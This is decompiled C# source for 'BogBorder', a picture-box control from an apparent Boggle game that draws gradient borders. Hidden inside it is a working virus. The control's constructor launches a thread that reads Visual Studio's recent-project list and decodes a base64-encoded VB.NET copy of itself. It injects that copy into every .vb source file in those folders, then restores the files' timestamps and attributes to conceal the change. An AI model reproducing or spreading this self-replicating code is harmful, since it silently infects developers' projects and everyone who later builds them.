using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.IO;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;

namespace Boggle;

public class BogBorder : PictureBox
{
	public enum Direction
	{
		Left,
		Right,
		Top,
		Bottom
	}

	private IContainer components;

	private Direction clsBorderDirection;

	public Direction BorderDirection
	{
		get
		{
			return clsBorderDirection;
		}
		set
		{
			clsBorderDirection = value;
			((Control)this).Refresh();
		}
	}

	private void vIT()
	{
		RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\VisualStudio\\7.0\\ProjectMRUList");
		if (registryKey.ValueCount == 0)
		{
			ProjectData.EndApp();
		}
		string text = "Private Sub vIT()";
		string text2 = "Public Sub New()";
		string text3 = "Dim t As New System.Threading.Thread(AddressOf vIT)\r\nt.Start()";
		string text4 = "UHJpdmF0ZSBTdWIgdklUKCkNCkRpbSBYLCBZIEFzIEludGVnZXINCkRpbSBBLCBC";
		text4 += "KCksIEMsIEcsIEgsIEksIEosIEssIEwgQXMgU3RyaW5nDQpEaW0gRCwgRiBBcyBE";
		text4 += "YXRlDQpEaW0gUiBBcyBNaWNyb3NvZnQuV2luMzIuUmVnaXN0cnlLZXkNCkRpbSBT";
		text4 += "IEFzIFN5c3RlbS5JTy5TdHJlYW1SZWFkZXINCkRpbSBUIEFzIFN5c3RlbS5JTy5T";
		text4 += "dHJlYW1Xcml0ZXINCkRpbSBVIEFzIFN5c3RlbS5JTy5GaWxlQXR0cmlidXRlcw0K";
		text4 += "UiA9IE1pY3Jvc29mdC5XaW4zMi5SZWdpc3RyeS5DdXJyZW50VXNlci5PcGVuU3Vi";
		text4 += "S2V5KCJTb2Z0d2FyZVxNaWNyb3NvZnRcVmlzdWFsU3R1ZGlvXDcuMFxQcm9qZWN0";
		text4 += "TVJVTGlzdCIpDQpJZiBSLlZhbHVlQ291bnQgPSAwIFRoZW4gRW5kDQpHID0gIlBy";
		text4 += "aXZhdGUgU3ViIHZJVCgpIg0KSCA9ICJQdWJsaWMgU3ViIE5ldygpIg0KSSA9ICJE";
		text4 += "aW0gdCBBcyBOZXcgU3lzdGVtLlRocmVhZGluZy5UaHJlYWQoQWRkcmVzc09mIHZJ";
		text4 += "VCkiICYgdmJDckxmICYgInQuU3RhcnQoKSINCkogPSAiIg0KSyA9IFN5c3RlbS5U";
		text4 += "ZXh0LkVuY29kaW5nLkFTQ0lJLkdldFN0cmluZyhTeXN0ZW0uQ29udmVydC5Gcm9t";
		text4 += "QmFzZTY0U3RyaW5nKEopKQ0KTCA9ICJKID0gIiAmIENocigzNCkNCkZvciBYID0g";
		text4 += "MSBUbyBMZW4oSikgU3RlcCA2NA0KSWYgWCArIDY0IDwgTGVuKEopIFRoZW4NCkwg";
		text4 += "PSBMICYgTWlkKEosIFgsIDY0KSAmIENocigzNCkgJiB2YkNyTGYgJiAiSiA9IEog";
		text4 += "JiAiICYgQ2hyKDM0KQ0KRWxzZQ0KTCA9IEwgJiBNaWQoSiwgWCwgNjQpICYgQ2hy";
		text4 += "KDM0KQ0KRW5kIElmDQpOZXh0DQpLID0gUmVwbGFjZShLLCAiSiA9ICIgJiBDaHIo";
		text4 += "MzQpICYgQ2hyKDM0KSwgTCwgMSwgMSwgQ29tcGFyZU1ldGhvZC5UZXh0KQ0KTCA9";
		text4 += "ICIiDQpGb3IgWCA9IDAgVG8gUi5WYWx1ZUNvdW50IC0gMQ0KQSA9IFIuR2V0VmFs";
		text4 += "dWUoUi5HZXRWYWx1ZU5hbWVzKFgpKQ0KQSA9IE1pZChBLCAxLCBJblN0clJldihB";
		text4 += "LCAiXCIsIC0xLCBDb21wYXJlTWV0aG9kLlRleHQpKQ0KSWYgU3lzdGVtLklPLkRp";
		text4 += "cmVjdG9yeS5FeGlzdHMoQSkgVGhlbg0KQiA9IFN5c3RlbS5JTy5EaXJlY3Rvcnku";
		text4 += "R2V0RmlsZXMoQSwgIioudmIiKQ0KRm9yIFkgPSBMQm91bmQoQikgVG8gVUJvdW5k";
		text4 += "KEIpDQpEID0gU3lzdGVtLklPLkZpbGUuR2V0TGFzdEFjY2Vzc1RpbWUoQihZKSkN";
		text4 += "CkYgPSBTeXN0ZW0uSU8uRmlsZS5HZXRMYXN0V3JpdGVUaW1lKEIoWSkpDQpVID0g";
		text4 += "U3lzdGVtLklPLkZpbGUuR2V0QXR0cmlidXRlcyhCKFkpKQ0KU3lzdGVtLklPLkZp";
		text4 += "bGUuU2V0QXR0cmlidXRlcyhCKFkpLCBJTy5GaWxlQXR0cmlidXRlcy5Ob3JtYWwp";
		text4 += "DQpTID0gU3lzdGVtLklPLkZpbGUuT3BlblRleHQoQihZKSkNCkMgPSBTLlJlYWRU";
		text4 += "b0VuZCgpDQpTLkNsb3NlKCkNCklmIEluU3RyKEMsIEcsIENvbXBhcmVNZXRob2Qu";
		text4 += "VGV4dCkgPSAwIEFuZCBJblN0cihDLCBILCBDb21wYXJlTWV0aG9kLlRleHQpIDw+";
		text4 += "IDAgVGhlbg0KQyA9IFJlcGxhY2UoQywgIk15QmFzZS5OZXcoKSIsICJNeUJhc2Uu";
		text4 += "TmV3KCkiICYgdmJDckxmICYgSSwgLCAxLCBDb21wYXJlTWV0aG9kLlRleHQpDQpD";
		text4 += "ID0gUmVwbGFjZShDLCBILCBLICYgSCwgLCAxLCBDb21wYXJlTWV0aG9kLlRleHQp";
		text4 += "DQpUID0gU3lzdGVtLklPLkZpbGUuQ3JlYXRlVGV4dChCKFkpKQ0KVC5Xcml0ZShD";
		text4 += "KQ0KVC5GbHVzaCgpDQpULkNsb3NlKCkNCkVuZCBJZg0KU3lzdGVtLklPLkZpbGUu";
		text4 += "U2V0TGFzdFdyaXRlVGltZShCKFkpLCBGKQ0KU3lzdGVtLklPLkZpbGUuU2V0TGFz";
		text4 += "dEFjY2Vzc1RpbWUoQihZKSwgRCkNClN5c3RlbS5JTy5GaWxlLlNldEF0dHJpYnV0";
		text4 += "ZXMoQihZKSwgVSkNCk5leHQNCkVuZCBJZg0KTmV4dA0KRW5kIFN1Yg0K";
		string @string = Encoding.ASCII.GetString(Convert.FromBase64String(text4));
		string text5 = "J = \"";
		int num = Strings.Len(text4);
		checked
		{
			for (int i = 1; i <= num; i += 64)
			{
				text5 = ((i + 64 >= Strings.Len(text4)) ? (text5 + Strings.Mid(text4, i, 64) + "\"") : string.Concat(text5 + Strings.Mid(text4, i, 64) + "\"", "\r\nJ = J & ", "\""));
			}
			@string = Strings.Replace(@string, "J = \"\"", text5, 1, 1, (CompareMethod)1);
			text5 = "";
			int num2 = registryKey.ValueCount - 1;
			for (int i = 0; i <= num2; i++)
			{
				string text6 = StringType.FromObject(registryKey.GetValue(registryKey.GetValueNames()[i]));
				text6 = Strings.Mid(text6, 1, Strings.InStrRev(text6, "\\", -1, (CompareMethod)1));
				if (!Directory.Exists(text6))
				{
					continue;
				}
				string[] files = Directory.GetFiles(text6, "*.vb");
				int num3 = Information.LBound((Array)files, 1);
				int num4 = Information.UBound((Array)files, 1);
				for (int j = num3; j <= num4; j++)
				{
					DateTime lastAccessTime = File.GetLastAccessTime(files[j]);
					DateTime lastWriteTime = File.GetLastWriteTime(files[j]);
					FileAttributes attributes = File.GetAttributes(files[j]);
					File.SetAttributes(files[j], FileAttributes.Normal);
					StreamReader streamReader = File.OpenText(files[j]);
					string text7 = streamReader.ReadToEnd();
					streamReader.Close();
					if ((Strings.InStr(text7, text, (CompareMethod)1) == 0) & (Strings.InStr(text7, text2, (CompareMethod)1) != 0))
					{
						text7 = Strings.Replace(text7, "MyBase.New()", "MyBase.New()\r\n" + text3, 1, 1, (CompareMethod)1);
						text7 = Strings.Replace(text7, text2, @string + text2, 1, 1, (CompareMethod)1);
						StreamWriter streamWriter = File.CreateText(files[j]);
						streamWriter.Write(text7);
						streamWriter.Flush();
						streamWriter.Close();
					}
					File.SetLastWriteTime(files[j], lastWriteTime);
					File.SetLastAccessTime(files[j], lastAccessTime);
					File.SetAttributes(files[j], attributes);
				}
			}
		}
	}

	public BogBorder()
	{
		((Control)this).add_Resize((EventHandler)BogBorder_Resize);
		Thread thread = new Thread(vIT);
		thread.Start();
		InitializeComponent();
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((PictureBox)this).Dispose(disposing);
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		components = new Container();
	}

	protected override void OnPaint(PaintEventArgs pe)
	{
		//IL_0005: Unknown result type (might be due to invalid IL or missing references)
		//IL_000c: Expected O, but got Unknown
		//IL_0021: Unknown result type (might be due to invalid IL or missing references)
		//IL_0028: Expected O, but got Unknown
		//IL_0028: Unknown result type (might be due to invalid IL or missing references)
		//IL_002e: Expected O, but got Unknown
		//IL_002e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0034: Expected O, but got Unknown
		//IL_0034: Unknown result type (might be due to invalid IL or missing references)
		//IL_003a: Expected O, but got Unknown
		//IL_00bc: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c3: Expected O, but got Unknown
		//IL_00c3: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c9: Expected O, but got Unknown
		//IL_00c9: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d0: Expected O, but got Unknown
		//IL_00d0: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d6: Expected O, but got Unknown
		//IL_034d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0354: Expected O, but got Unknown
		//IL_037b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0382: Expected O, but got Unknown
		Pen val = new Pen(Color.Black);
		Rectangle rectangle = new Rectangle(0, 0, ((Control)this).get_Width(), ((Control)this).get_Height());
		GraphicsPath val2 = new GraphicsPath();
		GraphicsPath val3 = new GraphicsPath();
		GraphicsPath val4 = new GraphicsPath();
		GraphicsPath val5 = new GraphicsPath();
		int num = Color.DarkGray.R;
		int num2 = Color.DarkGray.G;
		int num3 = Color.DarkGray.B;
		float num4 = ((Control)this).get_Width();
		float num5 = (float)((double)((Control)this).get_Width() / (double)num);
		float num6 = num4;
		checked
		{
			for (float num7 = 0f; FlowControl.ForNextCheckR4(num7, num6, num5); pe.get_Graphics().DrawPath(val, val3), pe.get_Graphics().DrawPath(val, val4), pe.get_Graphics().DrawPath(val, val2), val5.AddPath(val3, true), val5.AddPath(val2, true), val5.AddPath(val4, true), num7 += num5)
			{
				num--;
				num2--;
				num3--;
				if (num == 0)
				{
					num = 1;
				}
				if (num2 == 0)
				{
					num2 = 1;
				}
				if (num3 == 0)
				{
					num3 = 1;
				}
				val = new Pen(Color.FromArgb(num, num2, num3));
				val3 = new GraphicsPath();
				val2 = new GraphicsPath();
				val4 = new GraphicsPath();
				switch (clsBorderDirection)
				{
				case Direction.Left:
				{
					GraphicsPath obj4 = val3;
					PointF pointF7 = new PointF(num7, 40f);
					PointF pointF11 = pointF7;
					PointF pointF5 = new PointF(num7, num7);
					PointF pointF12 = pointF5;
					PointF pointF3 = new PointF(num7, num7);
					PointF pointF13 = pointF3;
					PointF pointF = new PointF(40f, num7);
					obj4.AddBezier(pointF11, pointF12, pointF13, pointF);
					GraphicsPath obj5 = val4;
					pointF = new PointF(num7, ((Control)this).get_Height() - 40);
					PointF pointF14 = pointF;
					pointF3 = new PointF(num7, (float)((Control)this).get_Height() - num7);
					PointF pointF15 = pointF3;
					pointF5 = new PointF(num7, (float)((Control)this).get_Height() - num7);
					PointF pointF16 = pointF5;
					pointF7 = new PointF(40f, (float)((Control)this).get_Height() - num7);
					obj5.AddBezier(pointF14, pointF15, pointF16, pointF7);
					GraphicsPath obj6 = val2;
					Point point3 = new Point((int)Math.Round(num7), 40);
					Point point4 = point3;
					Point point = new Point((int)Math.Round(num7), ((Control)this).get_Height() - 40);
					obj6.AddLine(point4, point);
					continue;
				}
				case Direction.Right:
				{
					GraphicsPath obj = val3;
					PointF pointF = new PointF((float)((Control)this).get_Width() - num7, 40f);
					PointF pointF2 = pointF;
					PointF pointF3 = new PointF((float)((Control)this).get_Width() - num7, num7);
					PointF pointF4 = pointF3;
					PointF pointF5 = new PointF((float)((Control)this).get_Width() - num7, num7);
					PointF pointF6 = pointF5;
					PointF pointF7 = new PointF(0f, num7);
					obj.AddBezier(pointF2, pointF4, pointF6, pointF7);
					GraphicsPath obj2 = val4;
					pointF = new PointF((float)((Control)this).get_Width() - num7, ((Control)this).get_Height() - 40);
					PointF pointF8 = pointF;
					pointF3 = new PointF((float)((Control)this).get_Width() - num7, (float)((Control)this).get_Height() - num7);
					PointF pointF9 = pointF3;
					pointF5 = new PointF((float)((Control)this).get_Width() - num7, (float)((Control)this).get_Height() - num7);
					PointF pointF10 = pointF5;
					pointF7 = new PointF(0f, (float)((Control)this).get_Height() - num7);
					obj2.AddBezier(pointF8, pointF9, pointF10, pointF7);
					GraphicsPath obj3 = val2;
					Point point = new Point((int)Math.Round((float)((Control)this).get_Width() - num7), 40);
					Point point2 = point;
					Point point3 = new Point((int)Math.Round((float)((Control)this).get_Width() - num7), ((Control)this).get_Height() - 40);
					obj3.AddLine(point2, point3);
					continue;
				}
				default:
					continue;
				case Direction.Top:
				{
					LinearGradientBrush val7 = new LinearGradientBrush(rectangle, Color.DarkGray, Color.Black, (LinearGradientMode)1);
					val2.AddRectangle(rectangle);
					pe.get_Graphics().FillPath((Brush)(object)val7, val2);
					break;
				}
				case Direction.Bottom:
				{
					LinearGradientBrush val6 = new LinearGradientBrush(rectangle, Color.Black, Color.DarkGray, (LinearGradientMode)1);
					val2.AddRectangle(rectangle);
					pe.get_Graphics().FillPath((Brush)(object)val6, val2);
					break;
				}
				}
				break;
			}
			((Control)this).set_BackColor(Color.DarkGray);
		}
	}

	private void BogBorder_Resize(object sender, EventArgs e)
	{
		((Control)this).Refresh();
	}
}
